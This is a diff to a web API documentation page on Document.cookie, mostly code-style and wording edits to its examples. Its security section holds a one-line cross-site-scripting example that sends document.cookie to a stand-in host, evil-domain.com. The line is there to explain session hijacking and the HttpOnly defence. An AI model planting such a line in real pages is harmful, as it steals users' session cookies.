@@ -13,6 +13,7 @@ tags:
   - cookie
 browser-compat: api.Document.cookie
 ---
+
 {{APIRef("DOM")}}
 
 The {{domxref("Document")}} property `cookie` lets
@@ -46,16 +47,11 @@ In the code above, `newCookie` is a string of form
 single cookie at a time using this method. Consider also that:
 
 - Any of the following cookie attribute values can optionally follow the key-value
-  pair, specifying the cookie to set/update, and preceded by a semi-colon separator:
+  pair, specifying the cookie to set/update, and preceded by a semicolon separator:
 
   - `;path=path` (e.g., '`/`',
     '`/mydir`') If not specified, defaults to the current path
     of the current document location.
-
-    > **Note:** Prior to {{Gecko("6.0")}}, paths
-    > with quotes were treated as if the quotes were part of the string,
-    > instead of as if they were delimiters surrounding the actual path
-    > string. This has been fixed.
 
   - `;domain=domain` (e.g.,
     '`example.com`' or '`subdomain.example.com`'). If
@@ -138,7 +134,7 @@ document.cookie = "favorite_food=tripe; SameSite=None; Secure";
 
 function showCookies() {
   const output = document.getElementById('cookies')
-  output.textContent = '> ' + document.cookie
+  output.textContent = `> ${document.cookie}`
 }
 
 function clearOutputCookies() {
@@ -150,9 +146,7 @@ function clearOutputCookies() {
 ```html
 <button onclick="showCookies()">Show cookies</button>
 
-<button onclick="clearOutputCookies()">
-  Clear
-</button>
+<button onclick="clearOutputCookies()">Clear</button>
 
 <div>
   <code id="cookies"></code>
@@ -161,7 +155,7 @@ function clearOutputCookies() {
 
 {{EmbedLiveSample('Example_1_Simple_usage', 200, 72)}}
 
-### Example #2: Get a sample cookie named _test2_
+### Example #2: Get a sample cookie named test2
 
 ```js
 // Note that we are setting `SameSite=None;` in this example because the example
@@ -173,12 +167,12 @@ document.cookie = "test2=World; SameSite=None; Secure";
 
 const cookieValue = document.cookie
   .split('; ')
-  .find(row => row.startsWith('test2='))
+  .find((row) => row.startsWith('test2='))
   ?.split('=')[1];
 
 function showCookieValue() {
   const output = document.getElementById('cookie-value')
-  output.textContent = '> ' + cookieValue
+  output.textContent = `> ${cookieValue}`
 }
 
 function clearOutputCookieValue() {
@@ -190,9 +184,7 @@ function clearOutputCookieValue() {
 ```html
 <button onclick="showCookieValue()">Show cookie value</button>
 
-<button onclick="clearOutputCookieValue()">
-  Clear
-</button>
+<button onclick="clearOutputCookieValue()">Clear</button>
 
 <div>
   <code id="cookie-value"></code>
@@ -208,7 +200,7 @@ In order to use the following code, please replace all occurrences of the word
 
 ```js
 function doOnce() {
-  if (!document.cookie.split('; ').find(row => row.startsWith('doSomethingOnlyOnce'))) {
+  if (!document.cookie.split('; ').find((row) => row.startsWith('doSomethingOnlyOnce'))) {
     // Note that we are setting `SameSite=None;` in this example because the example
     // needs to work cross-origin.
     // It is more common not to set the `SameSite` attribute, which results in the default,
@@ -229,9 +221,7 @@ function clearOutputDoOnce() {
 ```html
 <button onclick="doOnce()">Only do something once</button>
 
-<button onclick="clearOutputDoOnce()">
-  Clear
-</button>
+<button onclick="clearOutputDoOnce()">Clear</button>
 
 <div>
   <code id="do-once"></code>
@@ -263,9 +253,7 @@ function clearOutputResetOnce() {
 ```html
 <button onclick="resetOnce()">Reset only once cookie</button>
 
-<button onclick="clearOutputResetOnce()">
-  Clear
-</button>
+<button onclick="clearOutputResetOnce()">Clear</button>
 
 <div>
   <code id="reset-once"></code>
@@ -297,13 +285,9 @@ function clearOutputACookieExists() {
 ```
 
 ```html
-<button onclick="checkACookieExists()">
-  Check a cookie exists
-</button>
+<button onclick="checkACookieExists()">Check a cookie exists</button>
 
-<button onclick="clearOutputACookieExists()">
-  Clear
-</button>
+<button onclick="clearOutputACookieExists()">Clear</button>
 
 <div>
   <code id="a-cookie-existence"></code>
@@ -333,9 +317,7 @@ function clearASpecificValueOfTheCookie() {
   Check that a cookie has a specific value
 </button>
 
-<button onclick="clearASpecificValueOfTheCookie()">
-  Clear
-</button>
+<button onclick="clearASpecificValueOfTheCookie()">Clear</button>
 
 <div>
   <code id="a-specific-value-of-the-cookie"></code>
@@ -358,11 +340,11 @@ session. Stealing a cookie from a web application leads to hijacking the
 authenticated user's session. Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+(new Image()).src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
 ```
 
 The `HTTPOnly` cookie attribute can help to mitigate this attack by
-preventing access to cookie value through Javascript. Read more about [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
+preventing access to cookie value through JavaScript. Read more about [Cookies and Security](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).
 
 ## Notes
 
@@ -384,7 +366,7 @@ The reason for the [syntax](#syntax) of the `document.cookie`
 accessor property is due to the client-server nature of cookies, which differs from
 other client-client storage methods (like, for instance, [localStorage](/en-US/docs/Web/API/Web_Storage_API)):
 
-#### The server tells the client to store a cookie
+### The server tells the client to store a cookie
 
 ```bash
 HTTP/1.0 200 OK
@@ -395,7 +377,7 @@ Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT
 [content of the page here]
 ```
 
-#### The client sends back to the server its cookies previously stored
+### The client sends back to the server its cookies previously stored
 
 ```bash
 GET /sample_page.html HTTP/1.1
